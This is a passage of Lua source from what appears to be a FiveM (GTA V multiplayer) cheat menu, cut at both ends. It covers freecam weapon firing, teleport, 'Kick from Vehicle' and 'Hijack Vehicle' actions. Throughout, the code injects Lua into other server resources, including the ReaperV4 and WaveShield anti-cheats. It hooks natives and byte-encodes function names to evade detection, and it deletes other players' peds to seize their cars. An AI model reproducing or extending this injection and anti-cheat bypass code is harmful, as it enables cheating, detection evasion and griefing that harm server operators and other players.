                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                    local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey("]] .. weapon .. [[")

                                    GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                    SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            ]])
                            end
                        else
                            if _G.EsseFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(playerPed, weaponHash, 255, false, true)
                                MachoInjectThread(0, "ReaperV4", "", [[
                                local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]] ..
                                weaponHash .. [[, true, true)
                                if success then
                                    print("Updated Cache Successfully")
                                else
                                    print("Failed to Update Cache")
                                end
                            ]])
                                Wait(250)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100, -- damage
                                    true, -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true, -- isInvisible
                                    false, -- isCritical
                                    100000.0 -- speed
                                )
                            end
                        end
                    else
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.EsseFreecamObject then
                                    print("Toogie Doogie")

                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon",
                                        function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon",
                                        function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords",
                                        function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                    local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("WaveShield") == "started" and "WaveShield" or "any",
                                        string.format([[
                                    if not _G.EsseWeaponBypass then
                                        _G.EsseWeaponBypass = { enabled = false }
                                    end
                                    _G.EsseWeaponBypass.enabled = true

                                    local function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetHashKey", function(orig, str) return orig(str) end)
                                    hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                        if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                                            return orig(ped, hash, ammo, false, true)
                                        else
                                            return orig(ped, hash, ammo, isHidden, equipNow)
                                        end
                                    end)
                                    hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                        if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                                            return orig(ped, hash, true)
                                        else
                                            return orig(ped, hash, equipNow)
                                        end
                                    end)

                                    local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("WaveShield WeaponBypass error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        local ped = %d
                                        if _g(_b("DoesEntityExist"))(ped) then
                                            local weaponName = _d({%s})
                                            local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                            if weaponHash and weaponHash ~= 0 then
                                                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                            end
                                        end
                                    end)

                                    print("Zawg")
                                ]], playerPed, weaponBytes))

                                    Wait(150)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100, -- damage
                                        true, -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true, -- isInvisible
                                        false, -- isCritical
                                        100000.0 -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                if _G.EsseFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                    local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey("]] .. weapon .. [[")

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            ]])
                            end
                        else
                            if _G.EsseFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100, -- damage
                                    true, -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true, -- isInvisible
                                    false, -- isCritical
                                    100000.0 -- speed
                                )
                            end
                        end
                    end
                end
            end

            -- Left Click
            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption
                if action == "Teleport" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        if GetResourceState("WaveShield") == "started" then
                            if _G.EsseFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function GetEmptySeat(vehicle)
                                    local seats = {
                                        -1, 0, 1, 2
                                    }

                                    for _, seat in ipairs(seats) do
                                        if IsVehicleSeatFree(vehicle, seat) then
                                            return seat
                                        end
                                    end

                                    return -1
                                end

                                local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                local rot = GetCamRot(_G.EsseFreecamObject, 2)
                                local forward = RotationToDirection(rot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = PlayerPedId()
                                        local seat = GetEmptySeat(vehicle)
                                        if seat == -1 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                        else
                                            print("[^5SYNC^7]: There aren't any seats available in this vehicle.")
                                        end
                                    else
                                        SetEntityCoords(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false,
                                            false, false, false)
                                    end
                                else
                                    print("[^5SYNC^7]: There aren't any valid locations to teleport to.")
                                end
                            end
                        else
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any",
                                [[
                            if _G.EsseFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function GetEmptySeat(vehicle)
                                    local seats = {
                                        -1, 0, 1, 2
                                    }

                                    for _, seat in ipairs(seats) do
                                        if IsVehicleSeatFree(vehicle, seat) then
                                            return seat
                                        end
                                    end

                                    return -1
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                local rot = GetCamRot(_G.EsseFreecamObject, 2)
                                local forward = RotationToDirection(rot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = PlayerPedId()
                                        local seat = GetEmptySeat(vehicle)
                                        if seat == -1 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                        else
                                            print("[^5Esse^7]: There aren't any seats available in this vehicle.")
                                        end
                                    else
                                        SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                    end
                                else
                                    print("[^5Esse^7]: There aren't any valid locations to teleport to.")
                                end
                            end
                        ]])
                        end
                    else
                        if _G.EsseFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = {
                                    -1, 0, 1, 2
                                }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local camCoords = GetCamCoord(_G.EsseFreecamObject)
                            local rot = GetCamRot(_G.EsseFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0

                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x,
                                targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5Esse^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    MachoInjectThread(0, "any", "", [[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    SetEntityCoords(PlayerPedId(), ]] ..
                                    endCoords.x ..
                                    [[, ]] .. endCoords.y .. [[, ]] .. endCoords.z .. [[, false, false, false, false)
                                ]])
                                end
                            else
                                print("[^5Esse^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    end
                elseif action == "Kick from Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                            or (GetResourceState("WaveShield") == "started" and "WaveShield")
                            or "any"

                        Injection(targetRes, [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end
                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                        hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                        local function RequestControl(entity, timeoutMs)
                            timeoutMs = timeoutMs or 2000
                            local start = GetGameTimer()

                            while (GetGameTimer() - start) < timeoutMs do
                                if NetworkHasControlOfEntity(entity) then return true end
                                NetworkRequestControlOfEntity(entity)
                                Wait(0)
                            end

                            return NetworkHasControlOfEntity(entity)
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        function GetEmptySeat(vehicle)
                            local seats = { -1, 0, 1, 2 }

                            for _, seat in ipairs(seats) do
                                if IsVehicleSeatFree(vehicle, seat) then
                                    return seat
                                end
                            end

                            return -1
                        end

                        local player = PlayerPedId()
                        local oldCoords = GetEntityCoords(player)
                        local camCoords = GetCamCoord(_G[FLAG_CAM])
                        local rot = GetCamRot(_G[FLAG_CAM], 2)
                        local forward = RotationToDirection(rot)
                        local rayLength = 1000.0
                        local targetPos = camCoords + forward * rayLength
                        local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                        local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                        local function HijackCar(vehicle)
                            if not vehicle or not DoesEntityExist(vehicle) then
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                SetPedIntoVehicle(player, vehicle, 0)
                                RequestControl(vehicle, 2000)
                                Wait(10)

                                for i = 0, 4 do
                                    DeletePed(driver)
                                end

                                Wait(40)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(450)
                                ClearPedTasksImmediately(player)
                                SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                Wait(100)
                            end
                        end

                        CreateThread(function()
                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit

                                    HijackCar(vehicle)
                                end
                            end
                        end)
                    ]])
                    else
                        if _G.EsseFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity",
                                function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.EsseFreecamObject)
                            local rot = GetCamRot(_G.EsseFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x,
                                targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function KickFromVehicle(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource2("AsThreadNs", "monitor", [[
                                        DeletePed(]] .. driver .. [[)
                                    ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true,
                                        true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        KickFromVehicle(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Hijack Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                            or (GetResourceState("WaveShield") == "started" and "WaveShield")
                            or "any"

                        Injection(targetRes, [[
